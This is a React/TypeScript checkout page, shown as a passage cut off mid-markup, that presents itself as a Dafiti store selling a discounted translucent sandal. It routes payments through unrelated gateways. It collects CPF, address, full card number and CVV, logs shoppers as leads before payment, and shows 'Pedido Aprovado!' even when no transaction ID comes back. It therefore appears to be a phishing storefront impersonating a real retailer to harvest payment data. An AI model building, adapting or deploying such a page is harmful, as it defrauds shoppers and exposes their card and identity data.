import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useMemo, useState, type FormEvent } from "react";
import { QRCodeSVG } from "qrcode.react";
import {
  createCashinpayTransaction,
  getCashinpayTransaction,
} from "@/lib/cashinpay.functions";
import { createHypercashTransaction } from "@/lib/hypercash.functions";
import { recordLead, updateLeadStatus } from "@/lib/leads.functions";
import { fbqTrackSingle, fbqTrackCustomSingle, META_PIXEL_ID } from "@/lib/pixel";
import {
  ShieldCheck,
  Lock,
  Truck,
  CheckCircle2,
  AlertCircle,
  Copy,
  Clock,
  CreditCard,
  QrCode,
  Sparkles,
  ChevronLeft,
  Check,
  Package,
  ArrowRight,
  User,
  MapPin,
  Loader2,
} from "lucide-react";

// Assets
import dafitiLogo from "@/assets/dafiti-logo.png";
import translucidaBranca1 from "@/assets/mercadopromo/translucida-branca-1.jpg";
import translucidaBranca2 from "@/assets/mercadopromo/translucida-branca-2.jpg";
import translucidaBranca3 from "@/assets/mercadopromo/translucida-branca-3.jpg";
import translucidaMarrom1 from "@/assets/mercadopromo/translucida-marrom-1.jpg";
import translucidaMarrom2 from "@/assets/mercadopromo/translucida-marrom-2.jpg";
import translucidaMarrom3 from "@/assets/mercadopromo/translucida-marrom-3.jpg";
import translucidaRosa1 from "@/assets/mercadopromo/translucida-rosa-1.jpg";
import translucidaRosa2 from "@/assets/mercadopromo/translucida-rosa-2.jpg";
import translucidaRosa3 from "@/assets/mercadopromo/translucida-rosa-3.jpg";
import translucidaPreta1 from "@/assets/mercadopromo/translucida-preta-1.jpg";
import translucidaPreta2 from "@/assets/mercadopromo/translucida-preta-2.jpg";
import translucidaPreta3 from "@/assets/mercadopromo/translucida-preta-3.png";
import paymentBadgesImg from "@/assets/mercadopromo/payment-badges.png";

const PRODUCT_NAME = "Sandália Translúcida Jelly Mule Feminina";
const PRODUCT_PRICE_CENTS = 4990;
const SHIPPING_FEE_CENTS = 990;
const TOTAL_PRICE_CENTS = 5980;
const OLD_PRICE_CENTS = 18990;

const COLORS = [
  {
    id: "cristal",
    name: "Cristal Translúcida",
    hex: "#e2e8f0",
    images: [translucidaBranca1, translucidaBranca2, translucidaBranca3],
  },
  {
    id: "marrom",
    name: "Âmbar / Marrom Translúcido",
    hex: "#78350f",
    images: [translucidaMarrom1, translucidaMarrom2, translucidaMarrom3],
  },
  {
    id: "rosa",
    name: "Quartzo Rosa Translúcido",
    hex: "#f472b6",
    images: [translucidaRosa1, translucidaRosa2, translucidaRosa3],
  },
  {
    id: "preta",
    name: "Fumê / Preto Translúcido",
    hex: "#18181b",
    images: [translucidaPreta1, translucidaPreta2, translucidaPreta3],
  },
];

const SIZES = ["33", "34", "35", "36", "37", "38", "39", "40", "41", "42"];

const brl = (cents: number) =>
  (cents / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const onlyDigits = (v: string) => (v || "").replace(/\D/g, "");

const maskCPF = (v: string) =>
  onlyDigits(v)
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");

const maskPhone = (v: string) => {
  const d = onlyDigits(v).slice(0, 11);
  return d.length <= 10
    ? d.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3").trim()
    : d.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3").trim();
};

const maskCEP = (v: string) => onlyDigits(v).slice(0, 8).replace(/(\d{5})(\d)/, "$1-$2");

const maskCardNumber = (v: string) =>
  onlyDigits(v)
    .slice(0, 16)
    .replace(/(\d{4})(\d)/, "$1 $2")
    .replace(/(\d{4})\s(\d{4})(\d)/, "$1 $2 $3")
    .replace(/(\d{4})\s(\d{4})\s(\d{4})(\d)/, "$1 $2 $3 $4");

const maskExpiry = (v: string) =>
  onlyDigits(v)
    .slice(0, 4)
    .replace(/(\d{2})(\d)/, "$1/$2");

export const Route = createFileRoute("/checkout-dafiti")({
  validateSearch: (search: Record<string, unknown>) => {
    const out: { tam?: string; cor?: string } = {};
    if (typeof search.tam === "string") out.tam = search.tam;
    if (typeof search.cor === "string") out.cor = search.cor;
    return out;
  },
  head: () => ({
    meta: [
      { title: "DAFITI — Checkout Seguro" },
      {
        name: "description",
        content: "Finalize sua compra com segurança na Dafiti.",
      },
    ],
  }),
  component: DafitiCheckoutClean,
});

const inputCls =
  "w-full rounded-2xl border border-gray-300 bg-gray-50/80 px-3.5 py-3 text-xs sm:text-sm text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black transition-colors";

function DafitiCheckoutClean() {
  const search = Route.useSearch();
  const navigate = useNavigate();

  // Server functions
  const saveLead = useServerFn(recordLead);
  const updateLead = useServerFn(updateLeadStatus);
  const createTxCashinpay = useServerFn(createCashinpayTransaction);
  const getTxCashinpay = useServerFn(getCashinpayTransaction);
  const createTxHypercash = useServerFn(createHypercashTransaction);

  // Selections
  const selectedColorId =
    search.cor && COLORS.some((c) => c.id === search.cor) ? search.cor : COLORS[0].id;
  const selectedSize = search.tam && SIZES.includes(search.tam) ? search.tam : "36";

  const currentColor = useMemo(
    () => COLORS.find((c) => c.id === selectedColorId) || COLORS[0],
    [selectedColorId]
  );

  // 1 = Identificação, 2 = Entrega, 3 = Pagamento, 4 = Concluído
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3 | 4>(1);
  const [method, setMethod] = useState<"pix" | "card">("pix");

  const [form, setForm] = useState({
    name: "",
    email: "",
    document: "",
    phone: "",
    zipCode: "",
    street: "",
    streetNumber: "",
    complement: "",
    neighborhood: "",
    city: "",
    state: "",
  });

  const [card, setCard] = useState({
    number: "",
    holderName: "",
    expiry: "",
    cvv: "",
    installments: 1,
  });

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [cepLoading, setCepLoading] = useState(false);
  const [countdown, setCountdown] = useState(1800);

  const [pixData, setPixData] = useState<{
    qrcode?: string;
    qrcodeText?: string;
    transactionId?: string;
  }>({});

  const totalAmount = TOTAL_PRICE_CENTS / 100;

  useEffect(() => {
    try {
      fbqTrackSingle(META_PIXEL_ID, "PageView");
    } catch {}
  }, []);

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: "smooth" });
  }, [currentStep]);

  // ViaCEP Lookup
  const handleCepChange = async (raw: string) => {
    const masked = maskCEP(raw);
    setForm((prev) => ({ ...prev, zipCode: masked }));

    const digits = onlyDigits(raw);
    if (digits.length === 8) {
      setCepLoading(true);
      try {
        await new Promise((resolve) => setTimeout(resolve, 600));
        const res = await fetch(`https://viacep.com.br/ws/${digits}/json/`);
        const data = await res.json();
        if (!data.erro) {
          setForm((prev) => ({
            ...prev,
            street: data.logradouro || prev.street,
            neighborhood: data.bairro || prev.neighborhood,
            city: data.localidade || prev.city,
            state: data.uf || prev.state,
          }));
        }
      } catch {
      } finally {
        setCepLoading(false);
      }
    }
  };

  // STEP 1 -> STEP 2
  const handleNextStep1 = (e: FormEvent) => {
    e.preventDefault();
    setError(null);

    const name = form.name.trim();
    const email = form.email.trim();
    const cleanDoc = onlyDigits(form.document);
    const cleanPhone = onlyDigits(form.phone);

    if (name.length < 3) {
      setError("Por favor, digite seu nome completo.");
      return;
    }
    if (!email || !email.includes("@")) {
      setError("Por favor, digite um e-mail válido.");
      return;
    }
    if (cleanDoc.length < 11) {
      setError("Por favor, digite um CPF válido com 11 dígitos.");
      return;
    }
    if (cleanPhone.length < 10) {
      setError("Por favor, digite seu WhatsApp/celular com DDD.");
      return;
    }

    setCurrentStep(2);

    try {
      void saveLead({
        data: {
          leadId: form.document,
          productTitle: `[DAFITI] ${PRODUCT_NAME} (${currentColor.name})`,
          productColor: currentColor.name,
          productSize: selectedSize,
          quantity: 1,
          totalAmount,
          customer: {
            name,
            email: email.toLowerCase(),
            phone: form.phone,
            cpf: form.document,
          },
          status: "ABANDONED",
        },
      });
    } catch {}

    try {
      fbqTrackSingle(META_PIXEL_ID, "InitiateCheckout", {
        content_name: PRODUCT_NAME,
        value: totalAmount,
        currency: "BRL",
      });
    } catch {}
  };

  // STEP 2 -> STEP 3
  const handleNextStep2 = (e: FormEvent) => {
    e.preventDefault();
    setError(null);

    if (onlyDigits(form.zipCode).length < 8) {
      setError("Por favor, preencha o CEP de entrega.");
      return;
    }
    if (!form.street.trim()) {
      setError("Por favor, informe a rua ou avenida.");
      return;
    }
    if (!form.streetNumber.trim()) {
      setError("Por favor, informe o número da residência.");
      return;
    }
    if (!form.neighborhood.trim()) {
      setError("Por favor, informe o bairro.");
      return;
    }
    if (!form.city.trim() || !form.state.trim()) {
      setError("Por favor, preencha cidade e estado.");
      return;
    }

    setCurrentStep(3);

    try {
      void updateLead({
        data: {
          leadId: form.document,
          status: "INITIATED",
          shipping: {
            zipCode: form.zipCode,
            street: form.street,
            number: form.streetNumber,
            complement: form.complement,
            neighborhood: form.neighborhood,
            city: form.city,
            state: form.state,
          },
        },
      });
    } catch {}
  };

  // STEP 3 -> FINAL PAYMENT
  const handleFinishPayment = async (e: FormEvent) => {
    e.preventDefault();
    setError(null);
    setLoading(true);

    try {
      if (method === "pix") {
        const res = await createTxCashinpay({
          data: {
            amount: totalAmount,
            description: `${PRODUCT_NAME} - ${currentColor.name} (Tam ${selectedSize}) + Frete`,
            customer: {
              name: form.name.trim(),
              email: form.email.trim().toLowerCase(),
              phone: form.phone,
              document: form.document,
            },
            shipping: {
              zipCode: form.zipCode,
              street: form.street,
              number: form.streetNumber,
              complement: form.complement,
              neighborhood: form.neighborhood,
              city: form.city,
              state: form.state,
            },
          },
        });

        if (!res.success || (!res.qrcode && !res.qrcodeText)) {
          throw new Error(res.error || "Erro ao gerar PIX com a Cashinpay. Tente novamente.");
        }

        setPixData({
          qrcode: res.qrcode,
          qrcodeText: res.qrcodeText,
          transactionId: res.transactionId,
        });

        await updateLead({
          data: {
            leadId: form.document,
            status: "PIX_GENERATED",
            transactionId: res.transactionId,
            pixCode: res.qrcodeText,
            paymentMethod: "PIX",
          },
        });

        try {
          fbqTrackCustomSingle(META_PIXEL_ID, "PixGenerated", {
            content_name: PRODUCT_NAME,
            value: totalAmount,
            currency: "BRL",
          });
        } catch {}
      } else {
        const cleanCardNumber = onlyDigits(card.number);
        if (cleanCardNumber.length < 15) throw new Error("Número de cartão inválido (mínimo 15 dígitos).");
        if (card.holderName.trim().length < 3) throw new Error("Informe o nome do titular como impresso no cartão.");
        const expiryDigits = onlyDigits(card.expiry);
        if (expiryDigits.length < 4) throw new Error("Validade do cartão inválida (MM/AA).");
        if (onlyDigits(card.cvv).length < 3) throw new Error("Código de segurança (CVV) inválido.");

        const expMonth = parseInt(expiryDigits.slice(0, 2), 10);
        let expYear = parseInt(expiryDigits.slice(2, 4), 10);
        if (expYear < 100) expYear += 2000;

        const resHc = await createTxHypercash({
          data: {
            paymentMethod: "CREDIT_CARD",
            items: [
              {
                slug: "sandalia-translucida-jelly-mule-dafiti",
                title: `${PRODUCT_NAME} - ${currentColor.name} (Tam ${selectedSize})`,
                unitPriceCents: PRODUCT_PRICE_CENTS,
                quantity: 1,
              },
            ],
            shippingFeeCents: SHIPPING_FEE_CENTS,
            customer: {
              name: form.name.trim(),
              email: form.email.trim().toLowerCase(),
              document: form.document,
              phone: form.phone,
            },
            address: {
              zipCode: form.zipCode,
              street: form.street,
              streetNumber: form.streetNumber,
              complement: form.complement || undefined,
              neighborhood: form.neighborhood,
              city: form.city,
              state: form.state.toUpperCase(),
            },
            card: {
              number: cleanCardNumber,
              holderName: card.holderName.trim(),
              expirationMonth: expMonth,
              expirationYear: expYear,
              cvv: onlyDigits(card.cvv),
              installments: card.installments,
            },
          },
        });

        const txId = resHc?.id || `CARD_HC_${Date.now()}`;

        await updateLead({
          data: {
            leadId: form.document,
            status: "PAID",
            transactionId: String(txId),
            paymentMethod: "CREDIT_CARD",
          },
        });

        try {
          fbqTrackSingle(
            META_PIXEL_ID,
            "Purchase",
            { content_name: PRODUCT_NAME, value: totalAmount, currency: "BRL" },
            { eventID: String(txId) }
          );
        } catch {}

        setCurrentStep(4);
      }
    } catch (err: any) {
      setError(err?.message || "Ocorreu um erro ao processar seu pagamento. Verifique os dados.");
    } finally {
      setLoading(false);
    }
  };

  // Auto Polling for PIX
  useEffect(() => {
    if (currentStep !== 3 || !pixData.transactionId || currentStep === 4) return;

    const interval = setInterval(async () => {
      try {
        const check = await getTxCashinpay({
          data: { transactionId: pixData.transactionId! },
        });

        if (check.status === "paid") {
          clearInterval(interval);
          setCurrentStep(4);

          await updateLead({
            data: {
              leadId: form.document,
              status: "PAID",
              transactionId: pixData.transactionId,
              paymentMethod: "PIX",
            },
          });

          fbqTrackSingle(
            META_PIXEL_ID,
            "Purchase",
            { content_name: PRODUCT_NAME, value: totalAmount, currency: "BRL" },
            { eventID: pixData.transactionId }
          );
        }
      } catch (e) {
        console.warn("Polling error:", e);
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [currentStep, pixData.transactionId, form.document, totalAmount]);

  // Countdown timer
  useEffect(() => {
    if (currentStep !== 3 || !pixData.qrcodeText) return;
    const timer = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [currentStep, pixData.qrcodeText]);

  const copyPix = () => {
    if (pixData.qrcodeText) {
      navigator.clipboard.writeText(pixData.qrcodeText);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }
  };

  const steps = [
    { num: 1, label: "Identificação" },
    { num: 2, label: "Entrega" },
    { num: 3, label: "Pagamento" },
  ];

  return (
    <div className="min-h-screen bg-[#f7f7f7] font-sans text-gray-900 antialiased selection:bg-black selection:text-white pb-12">
      {/* TOP ANNOUNCEMENT BAR */}
      <div className="bg-black text-white text-[10px] sm:text-[11px] font-bold py-2 px-4 text-center tracking-[0.15em] uppercase flex items-center justify-center gap-2">
        <Sparkles size={13} className="text-amber-400 shrink-0" />
        <span>5% DE DESCONTO EXCLUSIVO NO PIX</span>
      </div>

      {/* DAFITI HEADER */}
      <header className="border-b border-neutral-800 bg-black sticky top-0 z-40 shadow-md">
        <div className="max-w-2xl mx-auto px-4 py-3.5 flex items-center justify-between">
          <Link to="/translucida-dafiti" className="flex items-center">
            <img src={dafitiLogo} alt="Dafiti" className="h-7 w-auto object-contain brightness-110" />
          </Link>
          <div className="flex items-center gap-2 text-[10px] sm:text-[11px] font-bold tracking-wider text-neutral-300 uppercase">
            <Lock size={13} className="text-emerald-400" />
            <span className="hidden sm:inline">PAGAMENTO 100% BLINDADO</span>
            <span className="sm:hidden">SEGURO</span>
          </div>
        </div>
      </header>

      {/* 3-STEP PROGRESS BAR */}
      {currentStep !== 4 && (
        <div className="bg-white border-b border-gray-200 py-3.5 px-4 shadow-2xs">
          <div className="max-w-2xl mx-auto flex items-center justify-between">
            {steps.map((s, i) => (
              <div key={s.num} className="flex items-center gap-0 flex-1">
                <div className="flex items-center gap-1.5">
                  <div
                    className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-black transition-all ${
                      currentStep > s.num
                        ? "bg-emerald-600 text-white"
                        : currentStep === s.num
                          ? "bg-black text-white shadow-xs"
                          : "bg-gray-100 text-gray-400"
                    }`}
                  >
                    {currentStep > s.num ? <Check size={14} /> : s.num}
                  </div>
                  <span
                    className={`text-[11px] font-bold uppercase tracking-wider hidden sm:inline ${
                      currentStep === s.num ? "text-black font-black" : currentStep > s.num ? "text-emerald-600" : "text-gray-400"
                    }`}
                  >
                    {s.label}
                  </span>
                </div>
                {i < steps.length - 1 && (
                  <div className={`flex-1 h-[2px] mx-3 transition-colors ${currentStep > s.num ? "bg-emerald-500" : "bg-gray-200"}`} />
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* MAIN BODY CONTAINER */}
      <main className="max-w-2xl mx-auto px-4 py-6 sm:py-8 space-y-5">
        {/* COMPACT PRODUCT SUMMARY CARD (always visible during checkout) */}
        {currentStep !== 4 && (
          <div className="bg-white rounded-3xl border border-gray-200 shadow-xs p-4 flex gap-4 items-center">
            <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-2xl overflow-hidden border border-gray-200 shrink-0 bg-gray-50">
              <img
                src={currentColor.images[0]}
                alt={PRODUCT_NAME}
                className="w-full h-full object-cover"
              />
            </div>
            <div className="flex-1 min-w-0">
              <h2 className="text-xs sm:text-sm font-black text-gray-900 leading-tight line-clamp-2">
                {PRODUCT_NAME}
              </h2>
              <p className="text-xs text-gray-500 mt-1 flex items-center gap-1.5 flex-wrap">
                <span
                  className="w-3 h-3 rounded-full border border-gray-300 shrink-0 inline-block"
                  style={{ backgroundColor: currentColor.hex }}
                />
                <span className="font-semibold">{currentColor.name}</span>
                <span className="text-gray-300">•</span>
                <span>Tam <strong>{selectedSize} BR</strong></span>
              </p>
              <div className="mt-1.5 flex items-baseline gap-2">
                <span className="text-xs text-gray-400 line-through">{brl(OLD_PRICE_CENTS)}</span>
                <span className="text-sm sm:text-base font-black text-gray-900">{brl(PRODUCT_PRICE_CENTS)}</span>
                <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded">
                  + Frete R$ 9,90
                </span>
              </div>
            </div>
            <Link
              to="/translucida-dafiti"
              className="text-[10px] text-gray-400 hover:text-black font-bold uppercase tracking-wider shrink-0 hidden sm:block"
            >
              Alterar
            </Link>
          </div>
        )}

        {/* STEP 4: SUCESSO / PEDIDO APROVADO */}
        {currentStep === 4 && (
          <div className="bg-white p-7 sm:p-8 rounded-3xl border border-gray-200 shadow-lg text-center space-y-5 animate-in zoom-in-95 duration-300">
            <div className="w-16 h-16 bg-emerald-50 text-emerald-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
              <CheckCircle2 size={36} />
            </div>
            <div>
              <h1 className="text-2xl font-black uppercase tracking-tight text-gray-900">
                Pedido Aprovado!
              </h1>
              <p className="text-xs text-gray-500 mt-1">
                Seu pagamento na Dafiti foi processado e já estamos preparando o envio.
              </p>
            </div>

            <div className="bg-gray-50 rounded-2xl p-4 text-left text-xs space-y-2 border border-gray-100 font-mono">
              <div className="flex justify-between">
                <span className="text-gray-500">Produto:</span>
                <span className="font-bold text-gray-900 text-right">{PRODUCT_NAME}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Cor / Tamanho:</span>
                <span className="font-bold text-gray-900">
                  {currentColor.name} • Tam {selectedSize} BR
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Total Pago:</span>
                <span className="font-bold text-emerald-600 text-sm">{brl(TOTAL_PRICE_CENTS)}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Destinatário:</span>
                <span className="font-bold text-gray-900">{form.name}</span>
              </div>
            </div>

            <div className="border border-emerald-100 bg-emerald-50/50 rounded-2xl p-3.5 text-[11px] text-emerald-800 text-left flex items-start gap-2.5">
              <Package size={18} className="shrink-0 mt-0.5" />
              <span>Você receberá as atualizações de postagem e o código de rastreamento dos Correios no WhatsApp e e-mail.</span>
            </div>

            <Link
              to="/translucida-dafiti"
              className="inline-block w-full bg-black hover:bg-neutral-800 text-white font-bold py-3.5 rounded-2xl text-xs uppercase tracking-widest transition-all shadow"
            >
              Voltar à Dafiti
            </Link>
          </div>
        )}

        {/* STEP 1: IDENTIFICAÇÃO */}
        {currentStep === 1 && (
          <form onSubmit={handleNextStep1} className="space-y-5 animate-in fade-in duration-200">
            <section className="bg-white p-5 sm:p-6 rounded-3xl border border-gray-200 shadow-xs space-y-4">
              <div className="flex items-center gap-2 border-b border-gray-100 pb-3">
                <User size={16} className="text-black" />
                <h3 className="font-black text-xs uppercase tracking-widest text-gray-900">
                  Dados de Contato
                </h3>
              </div>

              <div className="space-y-3.5">
                <div>
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    Nome Completo *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="Ex: Maria Silva Oliveira"
                    value={form.name}
                    onChange={(e) => setForm({ ...form, name: e.target.value })}
                    className={inputCls}
                  />
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                  <div>
                    <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                      E-mail *
                    </label>
                    <input
                      type="email"
                      required
                      placeholder="seu@email.com"
                      value={form.email}
                      onChange={(e) => setForm({ ...form, email: e.target.value })}
                      className={inputCls}
                    />
                  </div>
                  <div>
                    <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                      WhatsApp / Celular *
                    </label>
                    <input
                      type="tel"
                      required
                      placeholder="(11) 99999-9999"
                      value={form.phone}
                      onChange={(e) => setForm({ ...form, phone: maskPhone(e.target.value) })}
                      className={inputCls}
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    CPF (Para Nota Fiscal) *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="000.000.000-00"
                    value={form.document}
                    onChange={(e) => setForm({ ...form, document: maskCPF(e.target.value) })}
                    className={`${inputCls} font-mono`}
                  />
                </div>
              </div>

              {error && (
                <div className="flex items-center gap-2 p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-2xl font-bold">
                  <AlertCircle size={16} className="shrink-0" />
                  <span>{error}</span>
                </div>
              )}

              <button
                type="submit"
                className="w-full bg-black hover:bg-neutral-900 active:scale-[0.99] text-white font-black py-4 rounded-2xl text-xs sm:text-sm uppercase tracking-widest transition-all shadow-lg flex items-center justify-center gap-2"
              >
                <span>Continuar para Entrega</span>
                <ArrowRight size={16} />
              </button>
            </section>
          </form>
        )}

        {/* STEP 2: ENDEREÇO */}
        {currentStep === 2 && (
          <form onSubmit={handleNextStep2} className="space-y-5 animate-in fade-in duration-200">
            <section className="bg-white p-5 sm:p-6 rounded-3xl border border-gray-200 shadow-xs space-y-4">
              <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                <div className="flex items-center gap-2">
                  <MapPin size={16} className="text-black" />
                  <h3 className="font-black text-xs uppercase tracking-widest text-gray-900">
                    Endereço de Entrega
                  </h3>
                </div>
                <button
                  type="button"
                  onClick={() => {
                    setError(null);
                    setCurrentStep(1);
                  }}
                  className="text-xs text-gray-500 hover:text-black font-bold flex items-center gap-1"
                >
                  <ChevronLeft size={14} /> Voltar
                </button>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-6 gap-3.5">
                <div className="sm:col-span-2">
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    CEP *
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      required
                      autoFocus
                      placeholder="00000-000"
                      value={form.zipCode}
                      onChange={(e) => handleCepChange(e.target.value)}
                      className={inputCls}
                    />
                    {cepLoading && (
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        <Loader2 size={16} className="animate-spin text-black" />
                      </div>
                    )}
                  </div>
                </div>

                <div className="sm:col-span-4">
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    Rua / Avenida *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="Ex: Av. Paulista"
                    value={form.street}
                    onChange={(e) => setForm({ ...form, street: e.target.value })}
                    className={inputCls}
                  />
                </div>

                <div className="sm:col-span-2">
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    Número *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="123"
                    value={form.streetNumber}
                    onChange={(e) => setForm({ ...form, streetNumber: e.target.value })}
                    className={inputCls}
                  />
                </div>

                <div className="sm:col-span-4">
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    Complemento
                  </label>
                  <input
                    type="text"
                    placeholder="Opcional (Apto, Bloco...)"
                    value={form.complement}
                    onChange={(e) => setForm({ ...form, complement: e.target.value })}
                    className={inputCls}
                  />
                </div>

                <div className="sm:col-span-3">
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    Bairro *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="Bairro"
                    value={form.neighborhood}
                    onChange={(e) => setForm({ ...form, neighborhood: e.target.value })}
                    className={inputCls}
                  />
                </div>

                <div className="sm:col-span-2">
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    Cidade *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="Cidade"
                    value={form.city}
                    onChange={(e) => setForm({ ...form, city: e.target.value })}
                    className={inputCls}
                  />
                </div>

                <div className="sm:col-span-1">
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                    UF *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="SP"
                    maxLength={2}
                    value={form.state}
                    onChange={(e) => setForm({ ...form, state: e.target.value.toUpperCase() })}
                    className={`${inputCls} text-center font-bold`}
                  />
                </div>
              </div>

              {/* OPÇÃO DE FRETE */}
              <div className="bg-amber-50/70 border border-amber-200/80 rounded-2xl p-3.5 flex items-center justify-between text-xs text-amber-900">
                <div className="flex items-center gap-2.5">
                  <Truck size={18} className="text-amber-700 shrink-0" />
                  <div>
                    <span className="font-bold block">Entrega Express (Correios)</span>
                    <span className="text-[10px] text-amber-800/80">Prazo estimado de 2 a 5 dias úteis</span>
                  </div>
                </div>
                <span className="font-black text-xs text-amber-950">{brl(SHIPPING_FEE_CENTS)}</span>
              </div>

              {error && (
                <div className="flex items-center gap-2 p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-2xl font-bold">
                  <AlertCircle size={16} className="shrink-0" />
                  <span>{error}</span>
                </div>
              )}

              <div className="flex gap-3 pt-1">
                <button
                  type="button"
                  onClick={() => {
                    setError(null);
                    setCurrentStep(1);
                  }}
                  className="px-5 py-3.5 border border-gray-300 hover:border-black rounded-2xl text-xs font-bold uppercase tracking-wider transition-all"
                >
                  Voltar
                </button>
                <button
                  type="submit"
                  className="flex-1 bg-black hover:bg-neutral-900 active:scale-[0.99] text-white font-black py-3.5 rounded-2xl text-xs sm:text-sm uppercase tracking-widest transition-all shadow-lg flex items-center justify-center gap-2"
                >
                  <span>Ir para Pagamento</span>
                  <ArrowRight size={16} />
                </button>
              </div>
            </section>
          </form>
        )}

        {/* STEP 3: FORMA DE PAGAMENTO */}
        {currentStep === 3 && (
          <div className="space-y-5 animate-in fade-in duration-200">
            {pixData.qrcodeText ? (
              /* PIX GERADO */
              <div className="bg-white p-5 sm:p-7 rounded-3xl border border-gray-200 shadow-lg space-y-5">
                <div className="text-center space-y-1">
                  <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-50 text-amber-800 border border-amber-200 text-[11px] font-bold uppercase tracking-wider mb-2">
                    <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
                    Aguardando Pagamento
                  </div>
                  <h2 className="text-lg sm:text-xl font-black uppercase tracking-tight text-gray-900">
                    PIX Gerado com Sucesso
                  </h2>
                  <p className="text-xs text-gray-500">
                    Escaneie o QR Code no app do banco ou copie o código abaixo.
                  </p>
                </div>

                {/* QR CODE BOX */}
                <div className="bg-gray-50 border border-gray-200 rounded-2xl p-5 flex flex-col items-center space-y-3 mx-auto max-w-xs">
                  <div className="bg-white p-3 rounded-2xl shadow-sm border border-gray-100">
                    <QRCodeSVG value={pixData.qrcodeText} size={180} level="M" />
                  </div>
                  <div className="text-center">
                    <div className="text-2xl font-black text-gray-900">{brl(TOTAL_PRICE_CENTS)}</div>
                    <div className="text-[11px] text-gray-500 font-medium mt-0.5">
                      Produto + Frete (Correios)
                    </div>
                  </div>
                </div>

                {/* COPIA E COLA */}
                <div className="space-y-2">
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600">
                    Código Copia e Cola:
                  </label>
                  <textarea
                    readOnly
                    rows={2}
                    value={pixData.qrcodeText}
                    className="w-full rounded-2xl border border-gray-300 bg-gray-50 p-3 text-[11px] font-mono text-gray-700 select-all resize-none outline-none"
                  />
                  <button
                    type="button"
                    onClick={copyPix}
                    className={`w-full py-3.5 rounded-2xl font-bold text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 shadow ${
                      copied
                        ? "bg-emerald-600 text-white"
                        : "bg-black hover:bg-neutral-800 text-white active:scale-[0.99]"
                    }`}
                  >
                    {copied ? <Check size={16} /> : <Copy size={16} />}
                    <span>{copied ? "Código PIX Copiado!" : "Copiar Código PIX"}</span>
                  </button>
                </div>

                {/* TIMER & INFO */}
                <div className="border-t border-gray-100 pt-4 text-center space-y-2">
                  <div className="flex items-center justify-center gap-1.5 text-xs text-gray-500 font-medium">
                    <Clock size={14} className="text-amber-600" />
                    <span>
                      Expira em:{" "}
                      <strong className="text-gray-900 font-mono">
                        {Math.floor(countdown / 60)}:{(countdown % 60).toString().padStart(2, "0")}
                      </strong>
                    </span>
                  </div>
                  <p className="text-[11px] text-gray-400">
                    ⚡ A aprovação é imediata. Assim que você pagar no seu banco, esta página será atualizada automaticamente!
                  </p>
                </div>
              </div>
            ) : (
              /* FORM DE PAGAMENTO */
              <form onSubmit={handleFinishPayment} className="space-y-5">
                <section className="bg-white p-5 sm:p-6 rounded-3xl border border-gray-200 shadow-xs space-y-4">
                  <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                    <div className="flex items-center gap-2">
                      <CreditCard size={16} className="text-black" />
                      <h3 className="font-black text-xs uppercase tracking-widest text-gray-900">
                        Forma de Pagamento
                      </h3>
                    </div>
                    <button
                      type="button"
                      onClick={() => {
                        setError(null);
                        setCurrentStep(2);
                      }}
                      className="text-xs text-gray-500 hover:text-black font-bold flex items-center gap-1"
                    >
                      <ChevronLeft size={14} /> Voltar
